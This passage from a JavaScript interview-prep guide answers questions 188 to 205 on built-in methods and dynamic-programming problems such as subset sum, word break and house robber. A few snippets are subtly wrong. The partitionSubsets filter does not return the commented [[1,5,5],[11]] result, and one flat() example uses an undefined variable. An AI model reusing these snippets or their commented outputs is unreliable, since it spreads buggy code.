    for (let j = 1; j <= n; j++) {
      if (str1[i - 1] === str2[j - 1]) {
        curr[j] = prev[j - 1] + 1;
        if (curr[j] > maxLength) {
          maxLength = curr[j];
          endIndex = i - 1;
        }
      }
    }
    prev = curr;
  }
  
  return str1.substring(endIndex - maxLength + 1, endIndex + 1);
}
```

---

### Question 188: What is the difference between `Number.isNaN()` and `isNaN()`?

#### Definition
Both check for NaN, but `isNaN()` does type coercion (converts values first) while `Number.isNaN()` is strict (no coercion). `isNaN('abc')` returns true (coerces to NaN), `Number.isNaN('abc')` returns false (string is not NaN). `Number.isNaN()` is more reliable and predictable.

#### Real-World Scenario / Case Study
Code was using `isNaN()` to validate numbers, but it returned true for strings, causing false positives. Switching to `Number.isNaN()` only caught actual NaN values. The validation became accurate, fixing bugs where valid string inputs were incorrectly rejected.

#### Example Code
```js
// isNaN - with type coercion:
console.log(isNaN(NaN));        // true
console.log(isNaN('NaN'));      // true (coerces string to NaN)
console.log(isNaN(undefined));  // true (coerces to NaN)
console.log(isNaN({}));         // true (coerces object to NaN)
console.log(isNaN('123'));      // false (coerces to number 123)
console.log(isNaN('abc'));      // true (can't coerce, becomes NaN)

// Number.isNaN - strict, no coercion:
console.log(Number.isNaN(NaN));        // true
console.log(Number.isNaN('NaN'));      // false (string is not NaN)
console.log(Number.isNaN(undefined));  // false
console.log(Number.isNaN({}));         // false
console.log(Number.isNaN('123'));      // false
console.log(Number.isNaN('abc'));      // false

// Better number validation:
function isNumber(value) {
  return typeof value === 'number' && !Number.isNaN(value);
}

// vs unreliable:
function isNumberBad(value) {
  return !isNaN(value);  // Fails for strings!
}

// Check for NaN:
const value = someCalculation();
if (Number.isNaN(value)) {
  // Handle NaN case
}
```

---

### Question 189: How do you implement a longest palindromic substring algorithm?

#### Definition
Longest palindromic substring finds the longest contiguous substring that reads the same forwards and backwards. Like finding the longest mirror image within a string. Different from subsequence - must be contiguous. Can use expand around centers or dynamic programming. Useful for string analysis or pattern detection.

#### Real-World Scenario / Case Study
A text analysis tool needed to find palindromes in DNA sequences. The longest palindromic substring algorithm identified these patterns. The system could analyze genetic sequences and find important structural palindromic regions.

#### Example Code
```js
// Expand around centers approach (O(n²)):
function longestPalindromicSubstring(s) {
  if (!s || s.length === 0) return '';
  
  let start = 0;
  let maxLength = 1;
  
  function expandAroundCenter(left, right) {
    while (left >= 0 && right < s.length && s[left] === s[right]) {
      const length = right - left + 1;
      if (length > maxLength) {
        maxLength = length;
        start = left;
      }
      left--;
      right++;
    }
  }
  
  for (let i = 0; i < s.length; i++) {
    // Odd length palindromes (center at i):
    expandAroundCenter(i, i);
    
    // Even length palindromes (center between i and i+1):
    expandAroundCenter(i, i + 1);
  }
  
  return s.substring(start, start + maxLength);
}

// DP approach:
function lpsDP(s) {
  const n = s.length;
  const dp = Array(n).fill(null).map(() => Array(n).fill(false));
  let start = 0;
  let maxLength = 1;
  
  // Single characters are palindromes:
  for (let i = 0; i < n; i++) {
    dp[i][i] = true;
  }
  
  // Check for length 2:
  for (let i = 0; i < n - 1; i++) {
    if (s[i] === s[i + 1]) {
      dp[i][i + 1] = true;
      start = i;
      maxLength = 2;
    }
  }
  
  // Check for length 3 and more:
  for (let len = 3; len <= n; len++) {
    for (let i = 0; i < n - len + 1; i++) {
      const j = i + len - 1;
      if (s[i] === s[j] && dp[i + 1][j - 1]) {
        dp[i][j] = true;
        start = i;
        maxLength = len;
      }
    }
  }
  
  return s.substring(start, start + maxLength);
}

// Usage:
console.log(longestPalindromicSubstring('babad'));  // 'bab' or 'aba'
console.log(longestPalindromicSubstring('cbbd'));  // 'bb'
```

---

### Question 190: What is the difference between `Array.prototype.flatMap()` and chaining `map().flat()`?

#### Definition
Both transform and flatten, but `flatMap` does it in one step while `map().flat()` does it in two. `flatMap` is more efficient - no intermediate array. `flatMap` only flattens one level, `map().flat(Infinity)` can flatten deeply. Use `flatMap` when you need map + flat(1), chain when you need deeper flattening.

#### Real-World Scenario / Case Study
Code was using `map().flat()` to transform and flatten arrays, creating unnecessary intermediate arrays. Switching to `flatMap()` improved performance and memory usage. The code also became more concise and readable.

#### Example Code
```js
const arr = [1, 2, 3];

// map().flat() - two steps:
const result1 = arr.map(n => [n, n * 2]).flat();
console.log(result1);  // [1, 2, 2, 4, 3, 6]

// flatMap - one step (more efficient):
const result2 = arr.flatMap(n => [n, n * 2]);
console.log(result2);  // [1, 2, 2, 4, 3, 6]

// Performance difference:
// map().flat() creates intermediate array:
// [1, 2, 3] -> [[1,2], [2,4], [3,6]] -> [1,2,2,4,3,6]
// Two array creations

// flatMap does it in one:
// [1, 2, 3] -> [1,2,2,4,3,6]
// One array creation

// flatMap only flattens one level:
const nested = [[[1, 2]], [[3, 4]]];
nested.flatMap(x => x);        // [[1, 2], [3, 4]] (one level)
nested.map(x => x).flat(2);     // [1, 2, 3, 4] (two levels)

// Common use case - splitting strings:
const sentences = ['Hello world', 'How are you'];
const words = sentences.flatMap(s => s.split(' '));
// ['Hello', 'world', 'How', 'are', 'you']
```

---

### Question 191: How do you implement a subset sum problem?

#### Definition
Subset sum determines if there's a subset of numbers that sums to a target value. Like checking if you can make exact change with available coins. Can be solved with dynamic programming or backtracking. Useful for resource allocation, partitioning problems, or constraint satisfaction.

#### Real-World Scenario / Case Study
A resource allocation system needed to check if resources could be allocated to meet targets. The subset sum algorithm verified feasibility. The system could validate allocations before attempting them, preventing failed operations.

#### Example Code
```js
// DP approach - check if subset exists:
function subsetSum(nums, target) {
  const n = nums.length;
  const dp = Array(n + 1).fill(null).map(() => Array(target + 1).fill(false));
  
  // Sum of 0 is always possible (empty subset):
  for (let i = 0; i <= n; i++) {
    dp[i][0] = true;
  }
  
  for (let i = 1; i <= n; i++) {
    for (let j = 1; j <= target; j++) {
      if (nums[i - 1] > j) {
        dp[i][j] = dp[i - 1][j];  // Can't include this number
      } else {
        dp[i][j] = dp[i - 1][j] || dp[i - 1][j - nums[i - 1]];
        // Skip or include
      }
    }
  }
  
  return dp[n][target];
}

// Space-optimized:
function subsetSumOptimized(nums, target) {
  const dp = new Array(target + 1).fill(false);
  dp[0] = true;
  
  for (const num of nums) {
    for (let j = target; j >= num; j--) {
      dp[j] = dp[j] || dp[j - num];
    }
  }
  
  return dp[target];
}

// Get actual subset:
function subsetSumWithSubset(nums, target) {
  const n = nums.length;
  const dp = Array(n + 1).fill(null).map(() => Array(target + 1).fill(false));
  const parent = Array(n + 1).fill(null).map(() => Array(target + 1).fill(null));
  
  for (let i = 0; i <= n; i++) {
    dp[i][0] = true;
  }
  
  for (let i = 1; i <= n; i++) {
    for (let j = 1; j <= target; j++) {
      if (nums[i - 1] > j) {
        dp[i][j] = dp[i - 1][j];
        parent[i][j] = [i - 1, j];
      } else {
        if (dp[i - 1][j]) {
          dp[i][j] = true;
          parent[i][j] = [i - 1, j];
        } else if (dp[i - 1][j - nums[i - 1]]) {
          dp[i][j] = true;
          parent[i][j] = [i - 1, j - nums[i - 1]];
        }
      }
    }
  }
  
  if (!dp[n][target]) return null;
  
  // Reconstruct subset:
  const subset = [];
  let i = n, j = target;
  while (i > 0 && j > 0) {
    const [prevI, prevJ] = parent[i][j];
    if (prevJ < j) {
      subset.unshift(nums[i - 1]);
    }
    i = prevI;
    j = prevJ;
  }
  
  return subset;
}

// Usage:
console.log(subsetSum([3, 34, 4, 12, 5, 2], 9));  // true
console.log(subsetSumWithSubset([3, 34, 4, 12, 5, 2], 9));  // [4, 5]
```

---

### Question 192: What is the difference between `String.prototype.padStart()` and `String.prototype.padEnd()`?

#### Definition
Both pad strings to a target length, but `padStart` adds padding at the beginning (left side) while `padEnd` adds at the end (right side). Like aligning text - `padStart` right-aligns, `padEnd` left-aligns. Useful for formatting, alignment, or fixed-width displays. Both use a padding string (default is space).

#### Real-World Scenario / Case Study
A reporting system needed to format numbers with fixed widths. Using `padStart` for right-aligned numbers and `padEnd` for left-aligned text made formatting consistent. The reports looked professional with proper alignment.

#### Example Code
```js
const str = '5';

// padStart - pad at beginning:
console.log(str.padStart(3, '0'));  // '005' (right-aligned numbers)
console.log(str.padStart(5));        // '    5' (spaces, default)

// padEnd - pad at end:
console.log(str.padEnd(3, '0'));     // '500'
console.log(str.padEnd(5));          // '5    '

// Common use cases:
// Format numbers with leading zeros:
const num = 42;
console.log(num.toString().padStart(5, '0'));  // '00042'

// Align text in columns:
const names = ['John', 'Jane', 'Bob'];
names.forEach(name => {
  console.log(name.padEnd(10) + '|');  // Left-aligned
});

// Format IDs:
const id = '123';
console.log(id.padStart(8, '0'));  // '00000123'

// Custom padding:
'hello'.padStart(10, '*');  // '*****hello'
'hello'.padEnd(10, '-');    // 'hello-----'
```

---

### Question 193: How do you implement a word break problem (dynamic programming)?

#### Definition
Word break determines if a string can be segmented into words from a dictionary. Like checking if a sentence can be made from available words. Uses dynamic programming to avoid recalculating subproblems. Useful for text processing, spell checking, or natural language processing.

#### Real-World Scenario / Case Study
A text processing system needed to validate if input could be constructed from a word dictionary. The word break algorithm verified this efficiently. The system could validate user input and suggest corrections when words couldn't be formed.

#### Example Code
```js
function wordBreak(s, wordDict) {
  const n = s.length;
  const dp = new Array(n + 1).fill(false);
  dp[0] = true;  // Empty string can always be segmented
  
  const wordSet = new Set(wordDict);
  
  for (let i = 1; i <= n; i++) {
    for (let j = 0; j < i; j++) {
      if (dp[j] && wordSet.has(s.substring(j, i))) {
        dp[i] = true;
        break;
      }
    }
  }
  
  return dp[n];
}

// Get all possible segmentations:
function wordBreakAll(s, wordDict) {
  const wordSet = new Set(wordDict);
  const memo = new Map();
  
  function backtrack(start) {
    if (start === s.length) {
      return [''];
    }
    
    if (memo.has(start)) {
      return memo.get(start);
    }
    
    const result = [];
    for (let end = start + 1; end <= s.length; end++) {
      const word = s.substring(start, end);
      if (wordSet.has(word)) {
        const rest = backtrack(end);
        for (const sentence of rest) {
          result.push(word + (sentence ? ' ' + sentence : ''));
        }
      }
    }
    
    memo.set(start, result);
    return result;
  }
  
  return backtrack(0);
}

// Usage:
console.log(wordBreak('leetcode', ['leet', 'code']));  // true
console.log(wordBreakAll('catsanddog', ['cat', 'cats', 'and', 'sand', 'dog']));
// ['cat sand dog', 'cats and dog']
```

---

### Question 194: What is the difference between `Array.prototype.flat()` and manual flattening with loops?

#### Definition
`flat()` is a built-in method that flattens nested arrays - like unpacking nested boxes. Manual flattening uses loops or recursion. `flat()` is simpler, more readable, and optimized. Manual flattening gives more control but is more code. Use `flat()` for standard flattening, manual for custom logic.

#### Real-World Scenario / Case Study
Code was manually flattening arrays with recursive functions, which was verbose and error-prone. Using `flat()` simplified the code and reduced bugs. The team standardized on `flat()` for all flattening needs.

#### Example Code
```js
const nested = [1, [2, 3], [4, [5, 6]]];

// flat() - built-in:
const flat1 = nested.flat(2);  // Flatten 2 levels
console.log(flat1);  // [1, 2, 3, 4, 5, 6]

const flat2 = nested.flat(Infinity);  // Flatten all levels
console.log(flat2);  // [1, 2, 3, 4, 5, 6]

// Manual flattening - recursive:
function flatten(arr, depth = Infinity) {
  const result = [];
  for (const item of arr) {
    if (Array.isArray(item) && depth > 0) {
      result.push(...flatten(item, depth - 1));
    } else {
      result.push(item);
    }
  }
  return result;
}

// Manual - iterative:
function flattenIterative(arr) {
  const result = [];
  const stack = [...arr];
  
  while (stack.length) {
    const next = stack.pop();
    if (Array.isArray(next)) {
      stack.push(...next);
    } else {
      result.push(next);
    }
  }
  
  return result.reverse();
}

// flat() is cleaner:
const flattened = arr.flat(2);  // Simple

// vs manual:
const flattened2 = flatten(arr, 2);  // More code
```

---

### Question 195: How do you implement a partition equal subset sum problem?

#### Definition
Partition equal subset sum checks if an array can be partitioned into two subsets with equal sums. Like dividing items into two equal-weight groups. Uses dynamic programming (similar to subset sum). Useful for load balancing, resource partitioning, or fair division problems.

#### Real-World Scenario / Case Study
A load balancing system needed to distribute tasks evenly across two servers. The partition algorithm verified if equal distribution was possible. The system could optimize task allocation, ensuring both servers had similar workloads.

#### Example Code
```js
function canPartition(nums) {
  const sum = nums.reduce((a, b) => a + b, 0);
  
  // If sum is odd, can't partition equally:
  if (sum % 2 !== 0) return false;
  
  const target = sum / 2;
  const n = nums.length;
  const dp = new Array(target + 1).fill(false);
  dp[0] = true;
  
  for (const num of nums) {
    for (let j = target; j >= num; j--) {
      dp[j] = dp[j] || dp[j - num];
    }
  }
  
  return dp[target];
}

// Get actual partition:
function partitionSubsets(nums) {
  const sum = nums.reduce((a, b) => a + b, 0);
  if (sum % 2 !== 0) return null;
  
  const target = sum / 2;
  const n = nums.length;
  const dp = Array(n + 1).fill(null).map(() => Array(target + 1).fill(false));
  const parent = Array(n + 1).fill(null).map(() => Array(target + 1).fill(null));
  
  for (let i = 0; i <= n; i++) {
    dp[i][0] = true;
  }
  
  for (let i = 1; i <= n; i++) {
    for (let j = 1; j <= target; j++) {
      if (nums[i - 1] > j) {
        dp[i][j] = dp[i - 1][j];
        parent[i][j] = [i - 1, j];
      } else {
        if (dp[i - 1][j]) {
          dp[i][j] = true;
          parent[i][j] = [i - 1, j];
        } else if (dp[i - 1][j - nums[i - 1]]) {
          dp[i][j] = true;
          parent[i][j] = [i - 1, j - nums[i - 1]];
        }
      }
    }
  }
  
  if (!dp[n][target]) return null;
  
  // Reconstruct first subset:
  const subset1 = [];
  let i = n, j = target;
  while (i > 0 && j > 0) {
    const [prevI, prevJ] = parent[i][j];
    if (prevJ < j) {
      subset1.unshift(nums[i - 1]);
    }
    i = prevI;
    j = prevJ;
  }
  
  // Second subset is remaining:
  const subset2 = nums.filter((num, idx) => !subset1.includes(num) || 
    subset1.indexOf(num) !== subset1.lastIndexOf(num));
  
  return [subset1, subset2];
}

// Usage:
console.log(canPartition([1, 5, 11, 5]));  // true (can partition)
console.log(partitionSubsets([1, 5, 11, 5]));  // [[1,5,5], [11]]
```

---

### Question 196: What is the difference between `String.prototype.localeCompare()` and simple comparison?

#### Definition
`localeCompare` compares strings according to locale-specific rules (language, region) - like comparing words in different languages correctly. Simple comparison (`<`, `>`) uses Unicode code points. `localeCompare` handles accents, special characters, and language-specific sorting correctly. Use `localeCompare` for user-facing sorting, simple comparison for programmatic sorting.

#### Real-World Scenario / Case Study
A multilingual app was sorting names incorrectly - accented characters weren't ordered properly. Using `localeCompare` with the correct locale fixed the sorting. Users saw names sorted correctly in their language, improving the user experience significantly.

#### Example Code
```js
const names = ['café', 'cafe', 'càfe', 'zebra'];

// Simple comparison (Unicode):
names.sort((a, b) => a < b ? -1 : a > b ? 1 : 0);
// May not handle accents correctly

// localeCompare - locale-aware:
names.sort((a, b) => a.localeCompare(b));
// Handles accents, special characters correctly

// With specific locale:
names.sort((a, b) => a.localeCompare(b, 'en'));
names.sort((a, b) => a.localeCompare(b, 'fr'));

// Options:
'a'.localeCompare('A');                    // -1 or 1 (case-sensitive)
'a'.localeCompare('A', undefined, { sensitivity: 'base' });  // 0 (case-insensitive)

// Numeric sorting:
['10', '2', '1'].sort((a, b) => a.localeCompare(b));
// ['1', '10', '2'] (lexicographic)

['10', '2', '1'].sort((a, b) => a.localeCompare(b, undefined, { numeric: true }));
// ['1', '2', '10'] (numeric)

// Return values:
'a'.localeCompare('b');  // Negative (a comes before b)
'a'.localeCompare('a');  // 0 (equal)
'b'.localeCompare('a');  // Positive (b comes after a)
```

---

### Question 197: How do you implement a unique paths problem (dynamic programming)?

#### Definition
Unique paths counts the number of ways to reach the bottom-right corner from top-left in a grid, moving only right or down. Like finding all possible routes through city blocks. Uses dynamic programming - each cell's paths = paths from above + paths from left. Classic DP problem.

#### Real-World Scenario / Case Study
A routing system needed to calculate possible paths between locations on a grid. The unique paths algorithm provided accurate counts. The system could analyze route options and optimize path selection based on available routes.

#### Example Code
```js
// Unique paths in m x n grid:
function uniquePaths(m, n) {
  const dp = Array(m).fill(null).map(() => Array(n).fill(1));
  
  for (let i = 1; i < m; i++) {
    for (let j = 1; j < n; j++) {
      dp[i][j] = dp[i - 1][j] + dp[i][j - 1];
    }
  }
  
  return dp[m - 1][n - 1];
}

// Space-optimized (only need previous row):
function uniquePathsOptimized(m, n) {
  let prev = new Array(n).fill(1);
  
  for (let i = 1; i < m; i++) {
    const curr = new Array(n).fill(1);
    for (let j = 1; j < n; j++) {
      curr[j] = prev[j] + curr[j - 1];
    }
    prev = curr;
  }
  
  return prev[n - 1];
}

// With obstacles:
function uniquePathsWithObstacles(obstacleGrid) {
  const m = obstacleGrid.length;
  const n = obstacleGrid[0].length;
  const dp = Array(m).fill(null).map(() => Array(n).fill(0));
  
  // First row and column:
  for (let i = 0; i < m && obstacleGrid[i][0] === 0; i++) {
    dp[i][0] = 1;
  }
  for (let j = 0; j < n && obstacleGrid[0][j] === 0; j++) {
    dp[0][j] = 1;
  }
  
  for (let i = 1; i < m; i++) {
    for (let j = 1; j < n; j++) {
      if (obstacleGrid[i][j] === 0) {
        dp[i][j] = dp[i - 1][j] + dp[i][j - 1];
      }
    }
  }
  
  return dp[m - 1][n - 1];
}

// Usage:
console.log(uniquePaths(3, 7));  // 28 paths
```

---

### Question 198: What is the difference between `Array.prototype.copyWithin()` and manual copying?

#### Definition
`copyWithin` copies a portion of an array to another location within the same array - like moving a paragraph within a document. Manual copying creates a new array or uses loops. `copyWithin` is efficient and modifies in place. Useful for shifting array segments or implementing circular buffers.

#### Real-World Scenario / Case Study
A circular buffer implementation was manually copying array segments, which was slow. Using `copyWithin` improved performance significantly. The buffer could handle high-frequency data updates efficiently.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// copyWithin - copies within same array:
arr.copyWithin(0, 3, 5);  // Copy indices 3-4 to index 0
console.log(arr);  // [4, 5, 3, 4, 5]

// Parameters: target, start, end
const arr2 = [1, 2, 3, 4, 5, 6, 7, 8];
arr2.copyWithin(0, 4);  // Copy from index 4 to end, to index 0
console.log(arr2);  // [5, 6, 7, 8, 5, 6, 7, 8]

// Manual copying:
function copyWithinManual(arr, target, start, end = arr.length) {
  const copied = arr.slice(start, end);
  for (let i = 0; i < copied.length && target + i < arr.length; i++) {
    arr[target + i] = copied[i];
  }
  return arr;
}

// Use cases:
// Shift array left:
const data = [1, 2, 3, 4, 5];
data.copyWithin(0, 1);  // [2, 3, 4, 5, 5] (shift left, last element duplicated)

// Circular buffer:
const buffer = new Array(10).fill(0);
let writeIndex = 0;

function addToBuffer(value) {
  buffer[writeIndex] = value;
  writeIndex = (writeIndex + 1) % buffer.length;
}

// Clear old data by shifting:
buffer.copyWithin(0, 5);  // Move second half to beginning
```

---

### Question 199: How do you implement a climbing stairs problem (dynamic programming)?

#### Definition
Climbing stairs counts ways to reach the top taking 1 or 2 steps at a time. Like Fibonacci - each step's ways = ways from previous step + ways from two steps back. Uses dynamic programming to avoid recalculating. Classic DP problem that's essentially Fibonacci numbers.

#### Real-World Scenario / Case Study
A game needed to calculate possible move combinations. The climbing stairs algorithm (Fibonacci) provided efficient calculation. The system could compute millions of combinations quickly, enabling real-time game mechanics.

#### Example Code
```js
// Climbing stairs - Fibonacci sequence:
function climbStairs(n) {
  if (n <= 2) return n;
  
  let first = 1;
  let second = 2;
  
  for (let i = 3; i <= n; i++) {
    const third = first + second;
    first = second;
    second = third;
  }
  
  return second;
}

// DP approach:
function climbStairsDP(n) {
  if (n <= 2) return n;
  
  const dp = new Array(n + 1);
  dp[1] = 1;
  dp[2] = 2;
  
  for (let i = 3; i <= n; i++) {
    dp[i] = dp[i - 1] + dp[i - 2];
  }
  
  return dp[n];
}

// With variable steps (can take 1, 2, or 3 steps):
function climbStairsVariable(n, steps = [1, 2, 3]) {
  const dp = new Array(n + 1).fill(0);
  dp[0] = 1;
  
  for (let i = 1; i <= n; i++) {
    for (const step of steps) {
      if (i >= step) {
        dp[i] += dp[i - step];
      }
    }
  }
  
  return dp[n];
}

// Usage:
console.log(climbStairs(5));  // 8 ways
// 1+1+1+1+1, 1+1+1+2, 1+1+2+1, 1+2+1+1, 1+2+2, 2+1+1+1, 2+1+2, 2+2+1
```

---

### Question 200: What is the difference between `Array.prototype.toLocaleString()` and `toString()`?

#### Definition
Both convert arrays to strings, but `toLocaleString` formats each element according to locale (language, region) - like formatting numbers with locale-specific separators. `toString` just joins with commas. `toLocaleString` is locale-aware, `toString` is not. Use `toLocaleString` for user-facing display, `toString` for programmatic use.

#### Real-World Scenario / Case Study
An international app was displaying numbers with wrong formatting - US format in European locales. Using `toLocaleString` with proper locales fixed the formatting. Numbers displayed correctly for each user's region, improving usability.

#### Example Code
```js
const arr = [1234.56, 'hello', new Date()];

// toString - simple comma join:
console.log(arr.toString());
// '1234.56,hello,Mon Oct 15 2023 12:00:00 GMT+0000'

// toLocaleString - locale-aware formatting:
console.log(arr.toLocaleString('en-US'));
// '1,234.56,hello,10/15/2023, 12:00:00 PM'

console.log(arr.toLocaleString('de-DE'));
// '1.234,56,hello,15.10.2023, 12:00:00'

// Number formatting:
const numbers = [1234.56, 7890.12];
numbers.toLocaleString('en-US');  // '1,234.56,7,890.12'
numbers.toLocaleString('de-DE');  // '1.234,56,7.890,12'

// Date formatting:
const dates = [new Date()];
dates.toLocaleString('en-US');  // '10/15/2023, 12:00:00 PM'
dates.toLocaleString('fr-FR');  // '15/10/2023 12:00:00'

// With options:
const num = 1234.56;
num.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
// '$1,234.56'
```

---

### Question 201: How do you implement a house robber problem (dynamic programming)?

#### Definition
House robber finds maximum money you can rob from houses arranged in a line, where you can't rob two adjacent houses. Like a thief planning which houses to hit. Uses dynamic programming - at each house, decide to rob (add its value + value from 2 houses back) or skip (value from previous house). Classic DP problem.

#### Real-World Scenario / Case Study
A resource allocation system needed to maximize value while avoiding conflicts. The house robber algorithm provided the optimal selection. The system could allocate resources efficiently, maximizing returns while respecting constraints.

#### Example Code
```js
// House Robber I - linear houses:
function rob(nums) {
  if (nums.length === 0) return 0;
  if (nums.length === 1) return nums[0];
  
  const dp = new Array(nums.length);
  dp[0] = nums[0];
  dp[1] = Math.max(nums[0], nums[1]);
  
  for (let i = 2; i < nums.length; i++) {
    dp[i] = Math.max(
      dp[i - 1],           // Skip current house
      dp[i - 2] + nums[i]  // Rob current house
    );
  }
  
  return dp[nums.length - 1];
}

// Space-optimized:
function robOptimized(nums) {
  let prev2 = 0;
  let prev1 = 0;
  
  for (const num of nums) {
    const temp = Math.max(prev1, prev2 + num);
    prev2 = prev1;
    prev1 = temp;
  }
  
  return prev1;
}

// House Robber II - circular (first and last are adjacent):
function robCircular(nums) {
  if (nums.length === 0) return 0;
  if (nums.length === 1) return nums[0];
  
  // Rob houses 0 to n-2, or 1 to n-1:
  return Math.max(
    robLinear(nums.slice(0, nums.length - 1)),
    robLinear(nums.slice(1))
  );
}

function robLinear(nums) {
  let prev2 = 0;
  let prev1 = 0;
  for (const num of nums) {
    const temp = Math.max(prev1, prev2 + num);
    prev2 = prev1;
    prev1 = temp;
  }
  return prev1;
}

// Usage:
console.log(rob([2, 7, 9, 3, 1]));  // 12 (rob houses 0, 2, 4)
console.log(robCircular([2, 3, 2]));  // 3 (can't rob first and last)
```

---

### Question 202: What is the difference between `Number.isInteger()` and checking `typeof value === 'number'`?

#### Definition
`isInteger` checks if a number is an integer (whole number, no decimal) - like checking if it's a counting number. `typeof === 'number'` just checks if it's any number type (including decimals, NaN, Infinity). `isInteger` is more specific - it excludes floats, NaN, and Infinity. Use `isInteger` when you need whole numbers specifically.

#### Real-World Scenario / Case Study
Code was using `typeof === 'number'` to validate IDs, but it accepted decimals and NaN. Using `Number.isInteger()` ensured only whole numbers were accepted. This fixed bugs where invalid IDs like 12.5 or NaN were incorrectly accepted.

#### Example Code
```js
// typeof - checks if it's a number type:
console.log(typeof 5 === 'number');        // true
console.log(typeof 5.5 === 'number');     // true (includes decimals)
console.log(typeof NaN === 'number');      // true (NaN is number type!)
console.log(typeof Infinity === 'number'); // true

// Number.isInteger - checks if it's a whole number:
console.log(Number.isInteger(5));         // true
console.log(Number.isInteger(5.5));        // false (has decimal)
console.log(Number.isInteger(NaN));       // false
console.log(Number.isInteger(Infinity));  // false
console.log(Number.isInteger('5'));       // false (string)

// Combined check:
function isValidId(value) {
  return typeof value === 'number' && Number.isInteger(value) && value > 0;
}

// vs incomplete:
function isValidIdBad(value) {
  return typeof value === 'number';  // Accepts 5.5, NaN, etc.
}

// Common use cases:
// Validate array indices:
function safeArrayAccess(arr, index) {
  if (Number.isInteger(index) && index >= 0 && index < arr.length) {
    return arr[index];
  }
  return undefined;
}

// Validate user input:
const userId = parseFloat(userInput);
if (Number.isInteger(userId)) {
  // Valid integer ID
}
```

---

### Question 203: How do you implement a decode ways problem (dynamic programming)?

#### Definition
Decode ways counts how many ways a string of digits can be decoded, where '1'-'26' map to 'A'-'Z'. Like decoding a secret message where digits represent letters. Uses dynamic programming - each position can be decoded as single digit or two digits (if valid). Classic DP problem with careful edge case handling.

#### Real-World Scenario / Case Study
A messaging system needed to decode numeric codes to text. The decode ways algorithm counted valid decodings. The system could validate codes and handle ambiguous encodings correctly, preventing decoding errors.

#### Example Code
```js
function numDecodings(s) {
  if (!s || s[0] === '0') return 0;
  
  const n = s.length;
  const dp = new Array(n + 1).fill(0);
  dp[0] = 1;  // Empty string has 1 way
  dp[1] = 1;  // Single digit has 1 way (if not '0')
  
  for (let i = 2; i <= n; i++) {
    const oneDigit = parseInt(s[i - 1]);
    const twoDigits = parseInt(s.substring(i - 2, i));
    
    if (oneDigit >= 1 && oneDigit <= 9) {
      dp[i] += dp[i - 1];  // Can decode as single digit
    }
    
    if (twoDigits >= 10 && twoDigits <= 26) {
      dp[i] += dp[i - 2];  // Can decode as two digits
    }
  }
  
  return dp[n];
}

// Space-optimized:
function numDecodingsOptimized(s) {
  if (!s || s[0] === '0') return 0;
  
  let prev2 = 1;  // dp[i-2]
  let prev1 = 1;  // dp[i-1]
  
  for (let i = 2; i <= s.length; i++) {
    let current = 0;
    const oneDigit = parseInt(s[i - 1]);
    const twoDigits = parseInt(s.substring(i - 2, i));
    
    if (oneDigit >= 1 && oneDigit <= 9) {
      current += prev1;
    }
    
    if (twoDigits >= 10 && twoDigits <= 26) {
      current += prev2;
    }
    
    prev2 = prev1;
    prev1 = current;
  }
  
  return prev1;
}

// Usage:
console.log(numDecodings('12'));    // 2 ('1,2' or '12')
console.log(numDecodings('226'));   // 3 ('2,2,6', '22,6', '2,26')
console.log(numDecodings('06'));    // 0 (can't start with 0)
```

---

### Question 204: What is the difference between `String.prototype.charCodeAt()` and `String.prototype.codePointAt()`?

#### Definition
Both get character codes, but `charCodeAt` returns UTF-16 code units (16-bit) while `codePointAt` returns Unicode code points (full character value). For most characters they're the same, but for emojis and high Unicode characters (above U+FFFF), `codePointAt` is correct. `charCodeAt` can return surrogate pairs incorrectly. Use `codePointAt` for modern Unicode support.

#### Real-World Scenario / Case Study
A text processing system was using `charCodeAt` to analyze emoji characters, but it returned incorrect values for emojis. Switching to `codePointAt` correctly handled all Unicode characters including emojis. The system could process international text and emojis accurately.

#### Example Code
```js
const str = 'A';
console.log(str.charCodeAt(0));    // 65
console.log(str.codePointAt(0));  // 65 (same for ASCII)

// Difference with emojis/surrogates:
const emoji = '😀';
console.log(emoji.charCodeAt(0));    // 55357 (high surrogate, incomplete)
console.log(emoji.codePointAt(0));   // 128512 (correct Unicode code point)

// Surrogate pairs:
const str2 = '😀🎉';
console.log(str2.charCodeAt(0));    // 55357 (first surrogate)
console.log(str2.charCodeAt(1));    // 56832 (second surrogate)
console.log(str2.codePointAt(0));   // 128512 (full emoji code point)
console.log(str2.codePointAt(2));   // 127881 (second emoji)

// Iterating over Unicode characters:
function getCodePoints(str) {
  const codePoints = [];
  for (let i = 0; i < str.length; i++) {
    const code = str.codePointAt(i);
    codePoints.push(code);
    // Skip surrogate pair:
    if (code > 0xFFFF) i++;
  }
  return codePoints;
}

// Converting back:
String.fromCharCode(65);           // 'A'
String.fromCodePoint(128512);      // '😀'
String.fromCodePoint(65, 66, 67); // 'ABC'
```

---

### Question 205: How do you implement a minimum path sum problem (dynamic programming)?

#### Definition
Minimum path sum finds the path from top-left to bottom-right in a grid with minimum sum, moving only right or down. Like finding the cheapest route through a city with tolls. Uses dynamic programming - each cell's min sum = cell value + min of paths from above or left. Classic DP problem.

#### Real-World Scenario / Case Study
A routing system needed to find paths with minimum cost. The minimum path sum algorithm found optimal routes. The system could calculate cheapest paths through cost grids, enabling efficient route planning.

#### Example Code
```js
function minPathSum(grid) {
  const m = grid.length;
  const n = grid[0].length;
  const dp = Array(m).fill(null).map(() => Array(n).fill(0));
  
  // First cell:
  dp[0][0] = grid[0][0];
  
  // First row (can only come from left):
  for (let j = 1; j < n; j++) {
    dp[0][j] = dp[0][j - 1] + grid[0][j];
  }
  
  // First column (can only come from above):
  for (let i = 1; i < m; i++) {
    dp[i][0] = dp[i - 1][0] + grid[i][0];
  }
  
  // Fill rest:
  for (let i = 1; i < m; i++) {
    for (let j = 1; j < n; j++) {
      dp[i][j] = grid[i][j] + Math.min(dp[i - 1][j], dp[i][j - 1]);
    }
  }
  
  return dp[m - 1][n - 1];
}

// Space-optimized (only need previous row):
function minPathSumOptimized(grid) {
  const m = grid.length;
  const n = grid[0].length;
  let prev = new Array(n).fill(0);
  prev[0] = grid[0][0];
  
  // First row:
  for (let j = 1; j < n; j++) {
    prev[j] = prev[j - 1] + grid[0][j];
  }
  
  for (let i = 1; i < m; i++) {
    const curr = new Array(n);
    curr[0] = prev[0] + grid[i][0];
    
    for (let j = 1; j < n; j++) {
      curr[j] = grid[i][j] + Math.min(prev[j], curr[j - 1]);
    }
    
    prev = curr;
  }
  
  return prev[n - 1];
}

// Usage:
const grid = [
  [1, 3, 1],
  [1, 5, 1],
  [4, 2, 1]
];
